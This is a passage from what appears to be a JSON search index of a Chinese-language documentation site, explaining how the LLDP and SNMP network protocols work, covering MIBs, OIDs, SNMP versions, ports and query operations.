Base\uff09\u7684\u5f62\u5f0f\u4fdd\u5b58\u8d77\u6765\uff0c\u4ee5\u4f9b\u7f51\u7edc\u7ba1\u7406\u7cfb\u7edf\u67e5\u8be2\u53ca\u5224\u65ad\u94fe\u8def\u7684\u901a\u4fe1\u72b6\u51b5\u3002</p> <p>\u968f\u7740\u7f51\u7edc\u89c4\u6a21\u8d8a\u6765\u8d8a\u5927\uff0c\u7f51\u7edc\u8bbe\u5907\u79cd\u7c7b\u7e41\u591a\uff0c\u5e76\u4e14\u5404\u81ea\u7684\u914d\u7f6e\u9519\u7efc\u590d\u6742\uff0c\u5bf9\u7f51\u7edc\u7ba1\u7406\u80fd\u529b\u7684\u8981\u6c42\u4e5f\u8d8a\u6765\u8d8a\u9ad8\u3002\u4f20\u7edf\u7f51\u7edc\u7ba1\u7406\u7cfb\u7edf\u591a\u6570\u53ea\u80fd\u5206\u6790\u5230\u4e09\u5c42\u7f51\u7edc\u62d3\u6251\u7ed3\u6784\uff0c\u65e0\u6cd5\u786e\u5b9a\u7f51\u7edc\u8bbe\u5907\u7684\u8be6\u7ec6\u62d3\u6251\u4fe1\u606f\u3001\u662f\u5426\u5b58\u5728\u914d\u7f6e\u51b2\u7a81\u7b49\u3002\u56e0\u6b64\u9700\u8981\u6709\u4e00\u4e2a\u6807\u51c6\u7684\u4e8c\u5c42\u4fe1\u606f\u4ea4\u6d41\u534f\u8bae\u3002</p> <p>LLDP \u63d0\u4f9b\u4e86\u4e00\u79cd\u6807\u51c6\u7684\u94fe\u8def\u5c42\u53d1\u73b0\u65b9\u5f0f\u3002\u901a\u8fc7 LLDP \u83b7\u53d6\u7684\u8bbe\u5907\u4e8c\u5c42\u4fe1\u606f\u80fd\u591f\u5feb\u901f\u83b7\u53d6\u76f8\u8fde\u8bbe\u5907\u7684\u62d3\u6251\u72b6\u6001\uff1b\u663e\u793a\u51fa\u5ba2\u6237\u7aef\u3001\u4ea4\u6362\u673a\u3001\u8def\u7531\u5668\u3001\u5e94\u7528\u670d\u52a1\u5668\u4ee5\u53ca\u7f51\u7edc\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u8def\u5f84\uff1b\u68c0\u6d4b\u8bbe\u5907\u95f4\u7684\u914d\u7f6e\u51b2\u7a81\u3001\u67e5\u8be2\u7f51\u7edc\u5931\u8d25\u7684\u539f\u56e0\u3002\u4f01\u4e1a\u7f51\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u7f51\u7ba1\u7cfb\u7edf\uff0c\u5bf9\u652f\u6301\u8fd0\u884c LLDP \u534f\u8bae\u7684\u8bbe\u5907\u8fdb\u884c\u94fe\u8def\u72b6\u6001\u76d1\u63a7\uff0c\u5728\u7f51\u7edc\u53d1\u751f\u6545\u969c\u7684\u65f6\u5019\u5feb\u901f\u8fdb\u884c\u6545\u969c\u5b9a\u4f4d\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/lldp/#lldp-\u5de5\u4f5c\u65b9\u5f0f","title":"LLDP \u5de5\u4f5c\u65b9\u5f0f","text":"<p>LLDP \u53ef\u4ee5\u5c06\u672c\u5730\u8bbe\u5907\u7684\u4fe1\u606f\u7ec4\u7ec7\u8d77\u6765\u5e76\u53d1\u5e03\u7ed9\u81ea\u5df1\u7684\u8fdc\u7aef\u8bbe\u5907\uff0c\u672c\u5730\u8bbe\u5907\u5c06\u6536\u5230\u7684\u8fdc\u7aef\u8bbe\u5907\u4fe1\u606f\u4ee5\u6807\u51c6 MIB \u7684\u5f62\u5f0f\u4fdd\u5b58\u8d77\u6765\u3002\u5de5\u4f5c\u539f\u7406\u5982\u4e0b\u56fe\u6240\u793a\u3002</p>      LLDP \u5de5\u4f5c\u539f\u7406      <p>LLDP \u57fa\u672c\u5b9e\u73b0\u539f\u7406\u4e3a\uff1a</p> <ol> <li>LLDP \u6a21\u5757\u901a\u8fc7 LLDP \u4ee3\u7406\u4e0e\u8bbe\u5907\u4e0a\u7269\u7406\u62d3\u6251 MIB\u3001\u5b9e\u4f53 MIB\u3001\u63a5\u53e3 MIB \u4ee5\u53ca\u5176\u4ed6\u7c7b\u578b MIB \u7684\u4ea4\u4e92\uff0c\u6765\u66f4\u65b0\u81ea\u5df1\u7684 LLDP \u672c\u5730\u7cfb\u7edf MIB\uff0c\u4ee5\u53ca\u672c\u5730\u8bbe\u5907\u81ea\u5b9a\u4e49\u7684 LLDP \u6269\u5c55 MIB\u3002</li> <li>\u5c06\u672c\u5730\u8bbe\u5907\u4fe1\u606f\u5c01\u88c5\u6210 LLDP \u5e27\u53d1\u9001\u7ed9\u8fdc\u7aef\u8bbe\u5907\u3002</li> <li>\u63a5\u6536\u8fdc\u7aef\u8bbe\u5907\u53d1\u8fc7\u6765\u7684 LLDP \u5e27\uff0c\u66f4\u65b0\u81ea\u5df1\u7684 LLDP \u8fdc\u7aef\u7cfb\u7edf MIB\uff0c\u4ee5\u53ca\u8fdc\u7aef\u8bbe\u5907\u81ea\u5b9a\u4e49\u7684 LLDP \u6269\u5c55 MIB\u3002</li> <li>\u901a\u8fc7 LLDP \u4ee3\u7406\u6536\u53d1 LLDP \u5e27\uff0c\u8bbe\u5907\u5c31\u5f88\u6e05\u695a\u5730\u77e5\u9053\u8fdc\u7aef\u8bbe\u5907\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u8fde\u63a5\u7684\u662f\u8fdc\u7aef\u8bbe\u5907\u7684\u54ea\u4e2a\u63a5\u53e3\u3001\u8fdc\u7aef\u8bbe\u5907\u7684 MAC \u5730\u5740\u7b49\u4fe1\u606f\u3002</li> </ol> <p>LLDP \u672c\u5730\uff08\u8fdc\u7aef\uff09\u7cfb\u7edf MIB \u7528\u6765\u4fdd\u5b58\u672c\u5730\uff08\u8fdc\u7aef\uff09\u8bbe\u5907\u4fe1\u606f\u3002\u8fd9\u4e9b\u4fe1\u606f\u5305\u62ec\u8bbe\u5907 ID\u3001\u63a5\u53e3 ID\u3001\u7cfb\u7edf\u540d\u79f0\u3001\u7cfb\u7edf\u63cf\u8ff0\u3001\u63a5\u53e3\u63cf\u8ff0\u3001\u7f51\u7edc\u7ba1\u7406\u5730\u5740\u7b49\u3002</p> <p>LLDP \u4ee3\u7406\u5b8c\u6210\u4e0b\u5217\u4efb\u52a1\uff1a</p> <ul> <li>\u7ef4\u62a4 LLDP \u672c\u5730\u7cfb\u7edf MIB \u548c LLDP \u8fdc\u7aef\u7cfb\u7edf MIB\u3002</li> <li>\u5728\u672c\u5730\u72b6\u6001\u53d1\u751f\u53d8\u5316\u7684\u60c5\u51b5\u4e0b\uff0c\u63d0\u53d6 LLDP \u672c\u5730\u7cfb\u7edf MIB \u4fe1\u606f\u5e76\u5411\u8fdc\u7aef\u8bbe\u5907\u53d1\u9001\u3002\u5728\u672c\u5730\u8bbe\u5907\u72b6\u6001\u4fe1\u606f\u6ca1\u6709\u53d8\u5316\u7684\u60c5\u51b5\u4e0b\uff0c\u6309\u7167\u4e00\u5b9a\u7684\u5468\u671f\u63d0\u53d6 LLDP \u672c\u5730\u7cfb\u7edf MIB \u4fe1\u606f\u5411\u8fdc\u7aef\u8bbe\u5907\u53d1\u9001\u3002</li> <li>\u8bc6\u522b\u5e76\u5904\u7406\u6536\u5230\u7684 LLDP \u5e27\u3002</li> <li>LLDP \u672c\u5730\u7cfb\u7edf MIB \u6216 LLDP \u8fdc\u7aef\u7cfb\u7edf MIB \u7684\u72b6\u6001\u53d1\u751f\u53d8\u5316\u7684\u60c5\u51b5\u4e0b\uff0c\u5411\u7f51\u7ba1\u53d1\u9001 LLDP \u544a\u8b66\u3002</li> </ul>","tags":["stable"]},{"location":"operation/network/network-technology/lldp/#lldp-\u62a5\u6587\u6536\u53d1\u673a\u5236","title":"LLDP \u62a5\u6587\u6536\u53d1\u673a\u5236","text":"<p>LLDP \u62a5\u6587\u53d1\u9001\u673a\u5236\uff1a</p> <ul> <li>\u5f53\u4f7f\u80fd LLDP \u529f\u80fd\u65f6\uff0c\u8bbe\u5907\u4f1a\u5468\u671f\u6027\u5730\u5411\u90bb\u5c45\u8bbe\u5907\u53d1\u9001 LLDP \u62a5\u6587\u3002\u5982\u679c\u8bbe\u5907\u7684\u672c\u5730\u914d\u7f6e\u53d1\u751f\u53d8\u5316\u5219\u7acb\u5373\u53d1\u9001 LLDP \u62a5\u6587\uff0c\u4ee5\u5c06\u672c\u5730\u4fe1\u606f\u7684\u53d8\u5316\u60c5\u51b5\u5c3d\u5feb\u901a\u77e5\u7ed9\u90bb\u5c45\u8bbe\u5907\u3002\u4e3a\u4e86\u9632\u6b62\u672c\u5730\u4fe1\u606f\u7684\u9891\u7e41\u53d8\u5316\u800c\u5f15\u8d77 LLDP \u62a5\u6587\u7684\u5927\u91cf\u53d1\u9001\uff0c\u6bcf\u53d1\u9001\u4e00\u4e2a LLDP \u62a5\u6587\u540e\u90fd\u9700\u5ef6\u8fdf\u4e00\u6bb5\u65f6\u95f4\u540e\u518d\u7ee7\u7eed\u53d1\u9001\u4e0b\u4e00\u4e2a\u62a5\u6587\u3002</li> <li>\u5f53\u53d1\u73b0\u65b0\u7684\u90bb\u5c45\u8bbe\u5907\uff08\u5373\u6536\u5230\u4e00\u4e2a\u65b0\u7684 LLDP \u62a5\u6587\u4e14\u672c\u5730\u5c1a\u672a\u4fdd\u5b58\u53d1\u9001\u8be5\u62a5\u6587\u8bbe\u5907\u4fe1\u606f\uff09\uff0c\u6216\u8005\u8bbe\u5907\u7684 LLDP \u529f\u80fd\u7531\u53bb\u4f7f\u80fd\u72b6\u6001\u53d8\u4e3a\u4f7f\u80fd\uff0c\u6216\u8005\u8bbe\u5907\u7684\u63a5\u53e3\u72b6\u6001\u7531 Down \u53d8\u4e3a Up \u7684\u65f6\u5019\uff0c\u8be5\u8bbe\u5907\u5c06\u81ea\u52a8\u542f\u7528\u5feb\u901f\u53d1\u9001\u673a\u5236\u3002\u5373\u5c06 LLDP \u62a5\u6587\u7684\u53d1\u9001\u5468\u671f\u7f29\u77ed\u4e3a 1 \u79d2\uff0c\u5e76\u8fde\u7eed\u53d1\u9001\u6307\u5b9a\u6570\u91cf\u7684 LLDP \u62a5\u6587\u540e\u518d\u6062\u590d\u4e3a\u6b63\u5e38\u7684\u53d1\u9001\u5468\u671f\u3002</li> </ul> <p>LLDP \u62a5\u6587\u63a5\u6536\u673a\u5236\uff1a</p> <p>\u5f53\u4f7f\u80fd LLDP \u529f\u80fd\u65f6\uff0c\u8bbe\u5907\u4f1a\u5bf9\u6536\u5230\u7684 LLDP \u62a5\u6587\u53ca\u5176\u643a\u5e26\u7684 TLV \u8fdb\u884c\u6709\u6548\u6027\u68c0\u67e5\uff0c\u901a\u8fc7\u68c0\u67e5\u540e\u518d\u5c06\u90bb\u5c45\u4fe1\u606f\u4fdd\u5b58\u5230\u672c\u5730\u8bbe\u5907\uff0c\u5e76\u6839\u636e LLDPDU \u62a5\u6587\u4e2d TLV \u643a\u5e26\u7684 TTL \u503c\u8bbe\u7f6e\u90bb\u5c45\u4fe1\u606f\u5728\u672c\u5730\u8bbe\u5907\u7684\u8001\u5316\u65f6\u95f4\u3002\u5982\u679c\u63a5\u6536\u5230\u7684 LLDPDU \u4e2d\u7684 TTL \u503c\u7b49\u4e8e\u96f6\uff0c\u5c06\u7acb\u523b\u8001\u5316\u6389\u8be5\u90bb\u5c45\u4fe1\u606f\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/lldp/#lldp-\u5b9e\u8df5","title":"LLDP \u5b9e\u8df5","text":"<p>\u5728 Linux \u7cfb\u7edf\u4e0a\u4f7f\u7528 <code>lldpd</code>\uff0c\u89c1 Linux \u7f51\u7edc#lldpd\u3002</p> <p>\u5728\u534e\u4e3a\u8bbe\u5907\u4e0a\u914d\u7f6e\u548c\u67e5\u770b LLDP\uff0c\u89c1 \u534e\u4e3a#LLDP\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/snmp/","title":"SNMP","text":"","tags":["help"]},{"location":"operation/network/network-technology/snmp/#snmp","title":"SNMP","text":"<p>Quote</p> <ul> <li>\u4ec0\u4e48\u662f SNMP - \u534e\u4e3a</li> </ul> <p>Todo</p> <ul> <li> \u4f7f\u7528\u53ef\u89c6\u5316\u6d4f\u89c8\u5668\u67e5\u9605\u4ea7\u5546\u63d0\u4f9b\u7684 MIB\u3002</li> </ul>","tags":["help"]},{"location":"operation/network/network-technology/snmp/#snmp-\u539f\u7406","title":"SNMP \u539f\u7406","text":"<p>\u7b80\u5355\u7f51\u7edc\u7ba1\u7406\u534f\u8bae SNMP\uff08Simple Network Management Protocol\uff09\u7528\u4e8e\u7f51\u7edc\u8bbe\u5907\u7684\u7ba1\u7406\u3002\u7f51\u7edc\u8bbe\u5907\u79cd\u7c7b\u591a\u79cd\u591a\u6837\uff0c\u4e0d\u540c\u8bbe\u5907\u5382\u5546\u63d0\u4f9b\u7684\u7ba1\u7406\u63a5\u53e3\uff08\u5982\u547d\u4ee4\u884c\u63a5\u53e3\uff09\u5404\u4e0d\u76f8\u540c\uff0c\u8fd9\u4f7f\u5f97\u7f51\u7edc\u7ba1\u7406\u53d8\u5f97\u6108\u53d1\u590d\u6742\u3002\u4e3a\u89e3\u51b3\u8fd9\u4e00\u95ee\u9898\uff0cSNMP \u5e94\u8fd0\u800c\u751f\u3002SNMP \u4f5c\u4e3a\u5e7f\u6cdb\u5e94\u7528\u4e8e TCP/IP \u7f51\u7edc\u7684\u7f51\u7edc\u7ba1\u7406\u6807\u51c6\u534f\u8bae\uff0c\u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u63a5\u53e3\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u4e0d\u540c\u79cd\u7c7b\u548c\u5382\u5546\u7684\u7f51\u7edc\u8bbe\u5907\u4e4b\u95f4\u7684\u7edf\u4e00\u7ba1\u7406\u3002</p>","tags":["help"]},{"location":"operation/network/network-technology/snmp/#snmp-\u7cfb\u7edf\u7ec4\u6210","title":"SNMP \u7cfb\u7edf\u7ec4\u6210","text":"<p>SNMP \u7cfb\u7edf\u7531\u7f51\u7edc\u7ba1\u7406\u7cfb\u7edf NMS\uff08Network Management System\uff09\u3001SNMP Agent\u3001\u88ab\u7ba1\u5bf9\u8c61 Management object \u548c\u7ba1\u7406\u4fe1\u606f\u5e93 MIB\uff08Management Information Base\uff09\u56db\u90e8\u5206\u7ec4\u6210\u3002NMS \u4f5c\u4e3a\u6574\u4e2a\u7f51\u7edc\u7684\u7f51\u7ba1\u4e2d\u5fc3\uff0c\u5bf9\u8bbe\u5907\u8fdb\u884c\u7ba1\u7406\u3002</p> <p>\u6bcf\u4e2a\u88ab\u7ba1\u7406\u8bbe\u5907\u4e2d\u90fd\u5305\u542b\u9a7b\u7559\u5728\u8bbe\u5907\u4e0a\u7684 SNMP Agent \u8fdb\u7a0b\u3001MIB \u548c\u591a\u4e2a\u88ab\u7ba1\u5bf9\u8c61\u3002NMS \u901a\u8fc7\u4e0e\u8fd0\u884c\u5728\u88ab\u7ba1\u7406\u8bbe\u5907\u4e0a\u7684 SNMP Agent \u4ea4\u4e92\uff0c\u7531 SNMP Agent \u901a\u8fc7\u5bf9\u8bbe\u5907\u7aef\u7684 MIB \u8fdb\u884c\u64cd\u4f5c\uff0c\u5b8c\u6210 NMS \u7684\u6307\u4ee4\u3002</p> ![snmp_arch](snmp.assets/snmp_arch.png){ width=80% align=center } SNMP \u7cfb\u7edf\u7ec4\u6210 <ul> <li>Managed Object\uff1a\u6307\u88ab\u7ba1\u7406\u5bf9\u8c61\u3002\u6bcf\u4e00\u4e2a\u8bbe\u5907\u53ef\u80fd\u5305\u542b\u591a\u4e2a\u88ab\u7ba1\u7406\u5bf9\u8c61\uff0c\u88ab\u7ba1\u7406\u5bf9\u8c61\u53ef\u4ee5\u662f\u8bbe\u5907\u4e2d\u7684\u67d0\u4e2a\u786c\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u662f\u5728\u786c\u4ef6\u3001\u8f6f\u4ef6\uff08\u5982\u8def\u7531\u9009\u62e9\u534f\u8bae\uff09\u4e0a\u914d\u7f6e\u7684\u53c2\u6570\u96c6\u5408\u3002</li> <li>MIB<ul> <li>MIB \u662f\u4e00\u4e2a\u6570\u636e\u5e93\uff0c\u6307\u660e\u4e86\u88ab\u7ba1\u7406\u8bbe\u5907\u6240\u7ef4\u62a4\u7684\u53d8\u91cf\u3002MIB \u5728\u6570\u636e\u5e93\u4e2d\u5b9a\u4e49\u4e86\u88ab\u7ba1\u7406\u8bbe\u5907\u7684\u4e00\u7cfb\u5217\u5c5e\u6027\uff1a\u5bf9\u8c61\u7684\u540d\u79f0\u3001\u5bf9\u8c61\u7684\u72b6\u6001\u3001\u5bf9\u8c61\u7684\u8bbf\u95ee\u6743\u9650\u548c\u5bf9\u8c61\u7684\u6570\u636e\u7c7b\u578b\u7b49\u3002MIB \u4e5f\u53ef\u4ee5\u770b\u4f5c\u662f NMS \u548c SNMP Agent \u4e4b\u95f4\u7684\u4e00\u4e2a\u63a5\u53e3\uff0c\u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\uff0cNMS \u5bf9\u88ab\u7ba1\u7406\u8bbe\u5907\u6240\u7ef4\u62a4\u7684\u53d8\u91cf\u8fdb\u884c\u67e5\u8be2/\u8bbe\u7f6e\u64cd\u4f5c\u3002</li> <li>MIB \u662f\u4ee5\u6811\u72b6\u7ed3\u6784\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6811\u7684\u8282\u70b9\u8868\u793a\u88ab\u7ba1\u7406\u5bf9\u8c61\uff0c\u5b83\u53ef\u4ee5\u7528\u4ece\u6839\u5f00\u59cb\u7684\u4e00\u6761\u8def\u5f84\u552f\u4e00\u5730\u8bc6\u522b\uff0c\u8fd9\u6761\u8def\u5f84\u5c31\u79f0\u4e3a OID\uff0c\u5982 system \u7684 OID \u4e3a 1.3.6.1.2.1.1\uff0cinterfaces \u7684 OID \u4e3a 1.3.6.1.2.1.2\u3002</li> </ul> </li> <li>SNMP Agent<ul> <li>SNMP Agent \u63a5\u6536\u5230 NMS \u7684\u8bf7\u6c42\u4fe1\u606f\u540e\uff0c\u901a\u8fc7 MIB \u8868\u5b8c\u6210\u76f8\u5e94\u6307\u4ee4\u540e\uff0c\u5e76\u628a\u64cd\u4f5c\u7ed3\u679c\u54cd\u5e94\u7ed9 NMS\u3002</li> <li>\u5f53\u8bbe\u5907\u53d1\u751f\u6545\u969c\u6216\u8005\u5176\u5b83\u4e8b\u4ef6\u65f6\uff0c\u8bbe\u5907\u4f1a\u901a\u8fc7 SNMP Agent \u4e3b\u52a8\u53d1\u9001 SNMP Traps \u7ed9 NMS\uff0c\u5411 NMS \u62a5\u544a\u8bbe\u5907\u5f53\u524d\u7684\u72b6\u6001\u53d8\u5316\u3002</li> </ul> </li> <li>NMS<ul> <li>NMS \u53ef\u4ee5\u5411\u8bbe\u5907\u4e0a\u7684 SNMP Agent \u53d1\u51fa\u8bf7\u6c42\uff0c\u67e5\u8be2\u6216\u4fee\u6539\u4e00\u4e2a\u6216\u591a\u4e2a\u5177\u4f53\u7684\u53c2\u6570\u503c\u3002</li> <li>NMS \u53ef\u4ee5\u63a5\u6536\u8bbe\u5907\u4e0a\u7684 SNMP Agent \u4e3b\u52a8\u53d1\u9001\u7684 SNMP Traps\uff0c\u4ee5\u83b7\u77e5\u88ab\u7ba1\u7406\u8bbe\u5907\u5f53\u524d\u7684\u72b6\u6001\u3002</li> </ul> </li> </ul>","tags":["help"]},{"location":"operation/network/network-technology/snmp/#snmp-\u7248\u672c","title":"SNMP \u7248\u672c","text":"<p>SNMP \u534f\u8bae\u5206\u4e3a\u4e09\u4e2a\u7248\u672c\uff1aSNMPv1\u3001SNMPv2c \u548c SNMPv3\u3002</p> <ul> <li>SNMPv1 \u662f SNMP \u534f\u8bae\u7684\u6700\u521d\u7248\u672c\uff0c\u63d0\u4f9b\u6700\u5c0f\u9650\u5ea6\u7684\u7f51\u7edc\u7ba1\u7406\u529f\u80fd\u3002SNMPv1 \u57fa\u4e8e\u56e2\u4f53\u540d\u8ba4\u8bc1\uff0c\u5b89\u5168\u6027\u8f83\u5dee\uff0c\u4e14\u8fd4\u56de\u62a5\u6587\u7684\u9519\u8bef\u7801\u4e5f\u8f83\u5c11\u3002</li> <li>SNMPv2c \u4e5f\u91c7\u7528\u56e2\u4f53\u540d\u8ba4\u8bc1\u3002\u5728 SNMPv1 \u7248\u672c\u7684\u57fa\u7840\u4e0a\u5f15\u5165\u4e86 GetBulk \u548c Inform \u64cd\u4f5c\uff0c\u652f\u6301\u66f4\u591a\u7684\u6807\u51c6\u9519\u8bef\u7801\u4fe1\u606f\uff0c\u652f\u6301\u66f4\u591a\u7684\u6570\u636e\u7c7b\u578b\uff08Counter64\u3001Counter32\uff09\u3002</li> <li>SNMPv3 \u4e3b\u8981\u5728\u5b89\u5168\u6027\u65b9\u9762\u8fdb\u884c\u4e86\u589e\u5f3a\uff0c\u63d0\u4f9b\u4e86\u57fa\u4e8e USM\uff08User Security Module\uff09\u7684\u8ba4\u8bc1\u52a0\u5bc6\u548c\u57fa\u4e8e VACM\uff08View-based Access Control Model\uff09\u7684\u8bbf\u95ee\u63a7\u5236\u3002SNMPv3 \u7248\u672c\u652f\u6301\u7684\u64cd\u4f5c\u548c SNMPv2c \u7248\u672c\u652f\u6301\u7684\u64cd\u4f5c\u4e00\u6837\u3002</li> </ul> <p>SNMP \u62a5\u6587\u662f\u666e\u901a\u7684 UDP \u62a5\u6587\uff0c\u534f\u8bae\u4e2d\u89c4\u5b9a\u6709\u4e24\u4e2a\u9ed8\u8ba4\u7aef\u53e3\u53f7\uff1a</p> <ul> <li>\u7aef\u53e3\u53f7 161\uff1aNMS \u53d1\u9001 Get\u3001GetNext\u3001GetBulk \u548c Set \u64cd\u4f5c\u8bf7\u6c42\u4ee5\u53ca SNMP Agent \u54cd\u5e94\u8fd9\u4e9b\u8bf7\u6c42\u64cd\u4f5c\u65f6\uff0c\u4f7f\u7528\u8be5\u7aef\u53e3\u53f7\u3002\u8be5\u7aef\u53e3\u53f7\u652f\u6301\u7528\u6237\u914d\u7f6e\uff0c\u4f46\u662f\u9700\u8981\u4fdd\u8bc1 NMS \u53d1\u9001\u8bf7\u6c42\u62a5\u6587\u4f7f\u7528\u7684\u7aef\u53e3\u53f7\u4e0e SNMP Agent \u54cd\u5e94\u8bf7\u6c42\u62a5\u6587\u4f7f\u7528\u7684\u7aef\u53e3\u53f7\u8981\u4e00\u81f4\u3002</li> <li>\u7aef\u53e3\u53f7 162\uff1aSNMP Agent \u5411 NMS \u53d1\u9001 Trap \u6216 Inform \u65f6\uff0c\u4f7f\u7528\u8be5\u7aef\u53e3\u53f7\u3002\u8be5\u7aef\u53e3\u53f7\u652f\u6301\u7528\u6237\u914d\u7f6e\uff0c\u4f46\u662f\u9700\u8981\u4fdd\u8bc1 SNMP Agent \u53d1\u9001 Trap \u6216 Inform \u7684\u7aef\u53e3\u53f7\u4e0e NMS \u76d1\u542c Trap \u6216 Inform \u7684\u7aef\u53e3\u53f7\u8981\u4e00\u81f4\u3002</li> </ul>","tags":["help"]},{"location":"operation/network/network-technology/snmp/#snmp-\u67e5\u8be2","title":"SNMP \u67e5\u8be2","text":"<p>SNMP \u67e5\u8be2\u64cd\u4f5c\u6709\u4e09\u79cd\uff1aGet\u3001GetNext \u548c GetBulk\u3002SNMPv1 \u7248\u672c\u4e0d\u652f\u6301 GetBulk \u64cd\u4f5c\u3002</p> <ul> <li>Get \u64cd\u4f5c\uff1aNMS \u4f7f\u7528\u8be5\u64cd\u4f5c\u4ece SNMP Agent \u4e2d\u83b7\u53d6\u4e00\u4e2a\u6216\u591a\u4e2a\u53c2\u6570\u503c\u3002</li> <li>GetNext \u64cd\u4f5c\uff1aNMS \u4f7f\u7528\u8be5\u64cd\u4f5c\u4ece SNMP Agent \u4e2d\u83b7\u53d6\u4e00\u4e2a\u6216\u591a\u4e2a\u53c2\u6570\u7684\u4e0b\u4e00\u4e2a\u53c2\u6570\u503c\u3002</li> <li>GetBulk \u64cd\u4f5c\uff1a\u57fa\u4e8e GetNext \u5b9e\u73b0\uff0c\u76f8\u5f53\u4e8e\u8fde\u7eed\u6267\u884c\u591a\u6b21 GetNext \u64cd\u4f5c\u3002\u5728 NMS \u4e0a\u53ef\u4ee5\u8bbe\u7f6e\u88ab\u7ba1\u7406\u8bbe\u5907\u5728\u4e00\u6b21 GetBulk \u62a5\u6587\u4ea4\u4e92\u65f6\uff0c\u6267\u884c GetNext \u64cd\u4f5c\u7684\u6b21\u6570\u3002</li> </ul> <p>\u62a5\u6587\u4e2d\u7684\u4e3b\u8981\u5b57\u6bb5\u5982\u4e0b\uff1a</p> SNMPv3SNMPv1/2 <p>\u62a5\u6587\u4e2d\u7684\u4e3b\u8981\u5b57\u6bb5\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <ul> <li>\u7248\u672c\uff1a\u8868\u793a SNMP \u7684\u7248\u672c\uff0c\u5982\u679c\u662f SNMPv3 \u62a5\u6587\u5219\u5bf9\u5e94\u5b57\u6bb5\u503c\u4e3a 3\u3002</li> <li>MsgID\uff1a\u8bf7\u6c42\u62a5\u6587\u7684\u5e8f\u5217\u53f7\u3002</li> <li>MaxSize\uff1a\u6d88\u606f\u53d1\u9001\u8005\u6240\u80fd\u591f\u5bb9\u7eb3\u7684\u6d88\u606f\u6700\u5927\u5b57\u8282\uff0c\u540c\u65f6\u4e5f\u8868\u660e\u4e86\u53d1\u9001\u8005\u80fd\u591f\u63a5\u6536\u5230\u7684\u6700\u5927\u5b57\u8282\u6570\u3002</li> <li>Flags\uff1a\u6d88\u606f\u6807\u8bc6\u4f4d\uff0c\u5360\u4e00\u4e2a\u5b57\u8282\uff0c\u6709\u4e09\u4e2a\u7279\u5f81\u4f4d\uff1areportableFlag\uff0cprivFlag \u548c authFlag\u3002<ul> <li>reportableFlag=1\uff0c\u5728\u80fd\u591f\u5bfc\u81f4 Report PDU \u751f\u6210\u7684\u60c5\u51b5\u4e0b\uff0cSNMPv3 \u62a5\u6587\u63a5\u6536\u65b9\u5fc5\u987b\u5411\u53d1\u9001\u65b9\u53d1\u9001 Report PDU\uff1breportableFlag=0\uff0cSNMPv3 \u62a5\u6587\u63a5\u6536\u65b9\u4e0d\u53d1\u9001 Report PDU\u3002\u53ea\u6709\u5728 SNMP PDU \u90e8\u5206\u4e0d\u80fd\u88ab\u89e3\u5bc6\u65f6\uff08\u6bd4\u5982\u7531\u4e8e\u5bc6\u94a5\u9519\u8bef\u5bfc\u81f4\u89e3\u5bc6\u5931\u8d25\u7b49\uff09\u624d\u4f1a\u7528\u5230 Report\u3002</li> <li>privFlag=1\uff0c\u5bf9 SNMPv3 \u62a5\u6587\u8fdb\u884c\u52a0\u5bc6\uff1bprivFlag=0\uff0c\u4e0d\u5bf9 SNMPv3 \u62a5\u6587\u8fdb\u884c\u52a0\u5bc6\u3002</li> <li>authFlag=1\uff0c\u5bf9 SNMPv3 \u62a5\u6587\u8fdb\u884c\u9274\u6743\uff1bauthFlag=0\uff0c\u4e0d\u5bf9 SNMPv3 \u62a5\u6587\u8fdb\u884c\u9274\u6743\u3002</li> <li>\u9664\u4e86 privFlag=1\uff0cauthFlag=0 \u7684\u60c5\u51b5\u5916\uff0c\u5176\u4ed6\u4efb\u610f\u7ec4\u5408\u90fd\u53ef\u4ee5\uff0c\u6240\u4ee5\u5728\u914d\u7f6e SNMPv3 \u7684\u5b89\u5168\u7ea7\u522b\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\uff1a\u5982\u679c\u7528\u6237\u7ec4\u662f privacy \u7ea7\u522b\uff0c\u7528\u6237\u548c\u544a\u8b66\u4e3b\u673a\u5c31\u5fc5\u987b\u662f privacy \u7ea7\u522b\uff1b\u7528\u6237\u7ec4\u662f authentication \u7ea7\u522b\uff0c\u7528\u6237\u548c\u544a\u8b66\u4e3b\u673a\u53ef\u4ee5\u662f privacy \u6216\u8005 authentication \u7ea7\u522b\u3002</li> </ul> </li> <li>SecurityModel\uff1a\u6d88\u606f\u91c7\u7528\u7684\u5b89\u5168\u6a21\u578b\uff0c\u53d1\u9001\u65b9\u548c\u63a5\u6536\u65b9\u5fc5\u987b\u91c7\u7528\u76f8\u540c\u7684\u5b89\u5168\u6a21\u578b\u3002</li> <li>SecurityParameters\uff1a\u5b89\u5168\u53c2\u6570\uff0c\u5305\u542b SNMP \u5b9e\u4f53\u5f15\u64ce\u7684\u76f8\u5173\u4fe1\u606f\u3001\u7528\u6237\u540d\u3001\u9274\u6743\u53c2\u6570\u3001\u52a0\u5bc6\u53c2\u6570\u7b49\u5b89\u5168\u4fe1\u606f\u3002</li> <li>Context EngineID\uff1aSNMP \u552f\u4e00\u6807\u8bc6\u7b26\uff0c\u548c PDU \u7c7b\u578b\u4e00\u8d77\u51b3\u5b9a\u5e94\u8be5\u53d1\u5f80\u54ea\u4e2a\u5e94\u7528\u7a0b\u5e8f\u3002</li> <li>Context Name\uff1a\u7528\u4e8e\u786e\u5b9a Context EngineID \u5bf9\u88ab\u7ba1\u7406\u8bbe\u5907\u7684 MIB \u89c6\u56fe\u3002</li> </ul> <ul> <li>\u7248\u672c\uff1a\u8868\u793a SNMP \u7684\u7248\u672c\uff0c\u5982\u679c\u662f SNMPv1 \u62a5\u6587\u5219\u5bf9\u5e94\u5b57\u6bb5\u503c\u4e3a 0\uff0cSNMPv2c \u5219\u4e3a 1\u3002</li> <li>\u56e2\u4f53\u540d\uff1a\u7528\u4e8e\u5728 SNMP Agent \u4e0e NMS 